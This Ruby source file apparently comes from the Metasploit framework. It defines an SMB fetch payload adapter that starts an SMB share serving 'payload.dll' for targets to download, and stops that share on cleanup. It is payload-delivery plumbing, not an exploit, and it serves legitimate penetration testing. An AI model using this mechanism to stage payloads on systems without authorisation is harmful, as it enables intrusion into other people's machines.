module Msf::Payload::Adapter::Fetch::SMB

  include Msf::Exploit::EXE
  include Msf::Payload::Adapter
  include Msf::Payload::Adapter::Fetch
  include Msf::Exploit::Remote::SMB::Server::Share

  def initialize(*args)
    super
  end

  def fetch_protocol
    'SMB'
  end

  def cleanup_handler
    @fetch_service.stop
    super
  end

  def setup_handler
    start_smb_fetch_handler(srvport, srvhost, srvuri, 'payload.dll')
    super
  end

  alias :bindhost :fetch_bindhost
  alias :bindport :fetch_bindport
end
